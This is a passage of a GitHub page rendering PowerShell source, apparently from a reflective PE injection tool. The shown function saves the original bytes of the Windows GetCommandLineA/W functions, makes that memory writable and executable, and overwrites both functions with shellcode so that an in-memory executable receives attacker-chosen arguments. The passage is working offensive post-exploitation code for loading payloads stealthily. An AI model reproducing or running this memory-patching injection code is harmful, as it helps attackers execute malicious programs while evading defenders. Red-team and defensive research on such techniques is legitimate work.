          <td id="L2030" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2030"></td>
          <td id="LC2030" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">3</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L2031" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2031"></td>
          <td id="LC2031" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">String</span>]</td>
        </tr>
        <tr>
          <td id="L2032" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2032"></td>
          <td id="LC2032" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ExeArguments</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L2033" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2033"></td>
          <td id="LC2033" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2034" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2034"></td>
          <td id="LC2034" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">4</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L2035" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2035"></td>
          <td id="LC2035" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L2036" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2036"></td>
          <td id="LC2036" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ExeDoneBytePtr</span></td>
        </tr>
        <tr>
          <td id="L2037" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2037"></td>
          <td id="LC2037" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L2038" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2038"></td>
          <td id="LC2038" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2039" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2039"></td>
          <td id="LC2039" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.</span></td>
        </tr>
        <tr>
          <td id="L2040" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2040"></td>
          <td id="LC2040" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ReturnArray</span> <span class="pl-k">=</span> <span class="pl-k">@</span>() </td>
        </tr>
        <tr>
          <td id="L2041" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2041"></td>
          <td id="LC2041" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2042" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2042"></td>
          <td id="LC2042" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PtrSize</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L2043" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2043"></td>
          <td id="LC2043" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">UInt32</span>]<span class="pl-smi">$OldProtectFlag</span> <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L2044" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2044"></td>
          <td id="LC2044" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2045" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2045"></td>
          <td id="LC2045" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$Kernel32Handle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetModuleHandle.Invoke</span></span>(<span class="pl-s"><span class="pl-pds">&quot;</span>Kernel32.dll<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2046" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2046"></td>
          <td id="LC2046" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$Kernel32Handle</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2047" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2047"></td>
          <td id="LC2047" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2048" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2048"></td>
          <td id="LC2048" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Kernel32 handle null<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2049" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2049"></td>
          <td id="LC2049" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2050" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2050"></td>
          <td id="LC2050" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2051" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2051"></td>
          <td id="LC2051" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$KernelBaseHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetModuleHandle.Invoke</span></span>(<span class="pl-s"><span class="pl-pds">&quot;</span>KernelBase.dll<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2052" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2052"></td>
          <td id="LC2052" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$KernelBaseHandle</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2053" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2053"></td>
          <td id="LC2053" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2054" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2054"></td>
          <td id="LC2054" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>KernelBase handle null<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2055" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2055"></td>
          <td id="LC2055" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2056" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2056"></td>
          <td id="LC2056" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2057" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2057"></td>
          <td id="LC2057" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>################################################</span></td>
        </tr>
        <tr>
          <td id="L2058" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2058"></td>
          <td id="LC2058" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.</span></td>
        </tr>
        <tr>
          <td id="L2059" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2059"></td>
          <td id="LC2059" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.</span></td>
        </tr>
        <tr>
          <td id="L2060" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2060"></td>
          <td id="LC2060" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$CmdLineWArgsPtr</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StringToHGlobalUni(<span class="pl-smi">$ExeArguments</span>)</td>
        </tr>
        <tr>
          <td id="L2061" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2061"></td>
          <td id="LC2061" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$CmdLineAArgsPtr</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StringToHGlobalAnsi(<span class="pl-smi">$ExeArguments</span>)</td>
        </tr>
        <tr>
          <td id="L2062" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2062"></td>
          <td id="LC2062" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L2063" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2063"></td>
          <td id="LC2063" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$GetCommandLineAAddr</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetProcAddress.Invoke</span></span>(<span class="pl-smi">$KernelBaseHandle</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>GetCommandLineA<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2064" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2064"></td>
          <td id="LC2064" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$GetCommandLineWAddr</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetProcAddress.Invoke</span></span>(<span class="pl-smi">$KernelBaseHandle</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>GetCommandLineW<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2065" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2065"></td>
          <td id="LC2065" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2066" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2066"></td>
          <td id="LC2066" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$GetCommandLineAAddr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero <span class="pl-k">-or</span> <span class="pl-smi">$GetCommandLineWAddr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2067" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2067"></td>
          <td id="LC2067" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2068" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2068"></td>
          <td id="LC2068" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>GetCommandLine ptr null. GetCommandLineA: <span class="pl-k"><span class="pl-pse">$</span></span><span class="pl-pse">(</span><span class="pl-c1">Get-Hex</span> <span class="pl-smi">$GetCommandLineAAddr</span><span class="pl-pse">)</span>. GetCommandLineW: <span class="pl-k"><span class="pl-pse">$</span></span><span class="pl-pse">(</span><span class="pl-c1">Get-Hex</span> <span class="pl-smi">$GetCommandLineWAddr</span><span class="pl-pse">)</span><span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2069" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2069"></td>
          <td id="LC2069" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2070" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2070"></td>
          <td id="LC2070" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2071" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2071"></td>
          <td id="LC2071" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Prepare the shellcode</span></td>
        </tr>
        <tr>
          <td id="L2072" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2072"></td>
          <td id="LC2072" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$Shellcode1</span> <span class="pl-k">=</span> <span class="pl-k">@</span>()</td>
        </tr>
        <tr>
          <td id="L2073" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2073"></td>
          <td id="LC2073" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$PtrSize</span> <span class="pl-k">-eq</span> <span class="pl-c1">8</span>)</td>
        </tr>
        <tr>
          <td id="L2074" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2074"></td>
          <td id="LC2074" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2075" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2075"></td>
          <td id="LC2075" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Shellcode1</span> <span class="pl-k">+=</span> <span class="pl-c1">0x48</span>	<span class="pl-c"><span class="pl-c">#</span>64bit shellcode has the 0x48 before the 0xb8</span></td>
        </tr>
        <tr>
          <td id="L2076" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2076"></td>
          <td id="LC2076" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2077" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2077"></td>
          <td id="LC2077" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Shellcode1</span> <span class="pl-k">+=</span> <span class="pl-c1">0xb8</span></td>
        </tr>
        <tr>
          <td id="L2078" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2078"></td>
          <td id="LC2078" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2079" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2079"></td>
          <td id="LC2079" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]<span class="pl-smi">$Shellcode2</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0xc3</span>)</td>
        </tr>
        <tr>
          <td id="L2080" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2080"></td>
          <td id="LC2080" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TotalSize</span> <span class="pl-k">=</span> <span class="pl-smi">$Shellcode1<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> <span class="pl-smi">$PtrSize</span> <span class="pl-k">+</span> <span class="pl-smi">$Shellcode2<span class="pl-smi">.Length</span></span></td>
        </tr>
        <tr>
          <td id="L2081" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2081"></td>
          <td id="LC2081" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2082" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2082"></td>
          <td id="LC2082" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2083" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2083"></td>
          <td id="LC2083" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Make copy of GetCommandLineA and GetCommandLineW</span></td>
        </tr>
        <tr>
          <td id="L2084" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2084"></td>
          <td id="LC2084" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetCommandLineAOrigBytesPtr</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::AllocHGlobal(<span class="pl-smi">$TotalSize</span>)</td>
        </tr>
        <tr>
          <td id="L2085" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2085"></td>
          <td id="LC2085" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetCommandLineWOrigBytesPtr</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::AllocHGlobal(<span class="pl-smi">$TotalSize</span>)</td>
        </tr>
        <tr>
          <td id="L2086" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2086"></td>
          <td id="LC2086" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions<span class="pl-smi">.memcpy.Invoke</span></span>(<span class="pl-smi">$GetCommandLineAOrigBytesPtr</span><span class="pl-k">,</span> <span class="pl-smi">$GetCommandLineAAddr</span><span class="pl-k">,</span> [<span class="pl-k">UInt64</span>]<span class="pl-smi">$TotalSize</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2087" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2087"></td>
          <td id="LC2087" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions<span class="pl-smi">.memcpy.Invoke</span></span>(<span class="pl-smi">$GetCommandLineWOrigBytesPtr</span><span class="pl-k">,</span> <span class="pl-smi">$GetCommandLineWAddr</span><span class="pl-k">,</span> [<span class="pl-k">UInt64</span>]<span class="pl-smi">$TotalSize</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2088" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2088"></td>
          <td id="LC2088" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ReturnArray</span> <span class="pl-k">+=</span> <span class="pl-k">,</span>(<span class="pl-smi">$GetCommandLineAAddr</span><span class="pl-k">,</span> <span class="pl-smi">$GetCommandLineAOrigBytesPtr</span><span class="pl-k">,</span> <span class="pl-smi">$TotalSize</span>)</td>
        </tr>
        <tr>
          <td id="L2089" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2089"></td>
          <td id="LC2089" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ReturnArray</span> <span class="pl-k">+=</span> <span class="pl-k">,</span>(<span class="pl-smi">$GetCommandLineWAddr</span><span class="pl-k">,</span> <span class="pl-smi">$GetCommandLineWOrigBytesPtr</span><span class="pl-k">,</span> <span class="pl-smi">$TotalSize</span>)</td>
        </tr>
        <tr>
          <td id="L2090" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2090"></td>
          <td id="LC2090" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2091" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2091"></td>
          <td id="LC2091" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Overwrite GetCommandLineA</span></td>
        </tr>
        <tr>
          <td id="L2092" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2092"></td>
          <td id="LC2092" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">UInt32</span>]<span class="pl-smi">$OldProtectFlag</span> <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L2093" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2093"></td>
          <td id="LC2093" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualProtect.Invoke</span></span>(<span class="pl-smi">$GetCommandLineAAddr</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$TotalSize</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>](<span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_EXECUTE_READWRITE</span></span>)<span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$OldProtectFlag</span>)</td>
        </tr>
        <tr>
          <td id="L2094" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2094"></td>
          <td id="LC2094" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2095" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2095"></td>
          <td id="LC2095" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2096" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2096"></td>
          <td id="LC2096" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Call to VirtualProtect failed<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2097" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2097"></td>
          <td id="LC2097" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2098" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2098"></td>
          <td id="LC2098" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2099" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2099"></td>
          <td id="LC2099" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetCommandLineAAddrTemp</span> <span class="pl-k">=</span> <span class="pl-smi">$GetCommandLineAAddr</span></td>
        </tr>
        <tr>
          <td id="L2100" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2100"></td>
          <td id="LC2100" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$Shellcode1</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$GetCommandLineAAddrTemp</span></td>
        </tr>
        <tr>
          <td id="L2101" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2101"></td>
          <td id="LC2101" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetCommandLineAAddrTemp</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$GetCommandLineAAddrTemp</span> (<span class="pl-smi">$Shellcode1<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L2102" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2102"></td>
          <td id="LC2102" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$CmdLineAArgsPtr</span><span class="pl-k">,</span> <span class="pl-smi">$GetCommandLineAAddrTemp</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2103" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2103"></td>
          <td id="LC2103" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetCommandLineAAddrTemp</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$GetCommandLineAAddrTemp</span> <span class="pl-smi">$PtrSize</span></td>
        </tr>
        <tr>
          <td id="L2104" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2104"></td>
          <td id="LC2104" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$Shellcode2</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$GetCommandLineAAddrTemp</span></td>
        </tr>
        <tr>
          <td id="L2105" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2105"></td>
          <td id="LC2105" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2106" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2106"></td>
          <td id="LC2106" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualProtect.Invoke</span></span>(<span class="pl-smi">$GetCommandLineAAddr</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$TotalSize</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$OldProtectFlag</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$OldProtectFlag</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2107" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2107"></td>
          <td id="LC2107" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2108" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2108"></td>
          <td id="LC2108" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2109" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2109"></td>
          <td id="LC2109" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Overwrite GetCommandLineW</span></td>
        </tr>
        <tr>
          <td id="L2110" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2110"></td>
          <td id="LC2110" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">UInt32</span>]<span class="pl-smi">$OldProtectFlag</span> <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L2111" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2111"></td>
          <td id="LC2111" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualProtect.Invoke</span></span>(<span class="pl-smi">$GetCommandLineWAddr</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$TotalSize</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>](<span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_EXECUTE_READWRITE</span></span>)<span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$OldProtectFlag</span>)</td>
        </tr>
        <tr>
          <td id="L2112" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2112"></td>
          <td id="LC2112" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2113" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2113"></td>
          <td id="LC2113" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2114" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2114"></td>
          <td id="LC2114" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Call to VirtualProtect failed<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2115" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2115"></td>
          <td id="LC2115" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2116" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2116"></td>
          <td id="LC2116" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2117" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2117"></td>
          <td id="LC2117" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetCommandLineWAddrTemp</span> <span class="pl-k">=</span> <span class="pl-smi">$GetCommandLineWAddr</span></td>
        </tr>
        <tr>
          <td id="L2118" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2118"></td>
          <td id="LC2118" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$Shellcode1</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$GetCommandLineWAddrTemp</span></td>
        </tr>
        <tr>
          <td id="L2119" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2119"></td>
          <td id="LC2119" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetCommandLineWAddrTemp</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$GetCommandLineWAddrTemp</span> (<span class="pl-smi">$Shellcode1<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
